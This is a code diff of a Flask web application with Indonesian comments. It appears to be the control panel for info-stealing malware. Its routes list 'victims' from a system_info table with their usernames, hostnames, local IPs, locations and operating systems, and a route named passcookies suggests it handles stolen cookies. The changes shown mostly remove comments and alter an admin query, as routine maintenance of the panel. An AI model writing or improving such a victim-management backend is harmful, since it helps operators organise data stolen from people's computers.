@@ -15,12 +15,10 @@ app.permanent_session_lifetime = timedelta(minutes=30)
 
 logging.basicConfig(level=logging.DEBUG)
 
-# Konfigurasi upload gambar
 ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}
 UPLOAD_FOLDER = 'static/profile_pictures'
 app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
 
-# Koneksi ke database
 def get_db_connection():
     return pymysql.connect(**database_connection)
 
@@ -58,7 +56,7 @@ def dashboard():
     user_id = session.get('id')
     conn = get_db_connection()
     cursor = conn.cursor(DictCursor)
-    cursor.execute("SELECT username, profile_picture FROM user WHERE id = %s", (user_id,))
+    cursor.execute("SELECT username FROM list_admin WHERE id = %s", (user_id,))
     user_data = cursor.fetchone()
     conn.close()
     
@@ -73,20 +71,17 @@ def get_victims():
     conn = get_db_connection()
     cursor = conn.cursor(DictCursor)
     
-    # Query untuk mengambil data korban dari tabel system_info atau tabel lainnya
     cursor.execute("SELECT id, username, hostname, local_ip, created_at FROM system_info")
     victims = cursor.fetchall()
     
     conn.close()
 
-    # Mengembalikan data sebagai JSON
     return jsonify(victims)
 
 @app.route('/overview')
 def overview():
-    victim_id = request.args.get('id')  # Mengambil parameter 'id' dari URL
+    victim_id = request.args.get('id')  
 
-    # Ambil data korban berdasarkan ID dari database
     conn = get_db_connection()
     cursor = conn.cursor(DictCursor)
     cursor.execute("SELECT username, hostname, local_ip, created_at, city, region, country, os FROM system_info WHERE id = %s", (victim_id,))
@@ -114,7 +109,6 @@ def settings():
         new_password = request.form['newPassword']
         confirm_password = request.form['confirmPassword']
 
-        # Handle password update
         if new_password != confirm_password:
             flash("Password dan konfirmasi password tidak cocok!", "error")
             return render_template('settings.html', user=user_data)
@@ -122,7 +116,6 @@ def settings():
         hashed_password = hashpw(new_password.encode('utf-8'), gensalt())
         cursor.execute("UPDATE user SET password = %s WHERE id = %s", (hashed_password, user_id))
 
-        # Handle profile picture upload
         if 'profile_picture' in request.files:
             file = request.files['profile_picture']
             if file and allowed_file(file.filename):
@@ -130,7 +123,6 @@ def settings():
                 file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
                 file.save(file_path)
 
-                # Update profile picture in database
                 cursor.execute("UPDATE user SET profile_picture = %s WHERE id = %s", (filename, user_id))
 
         conn.commit()
@@ -203,7 +195,6 @@ def location():
 
 @app.route('/passcookies')
 def passcookies():
-    # Ambil ID pengguna dari sesi
     user_id = session.get('id')
 
     if not user_id:
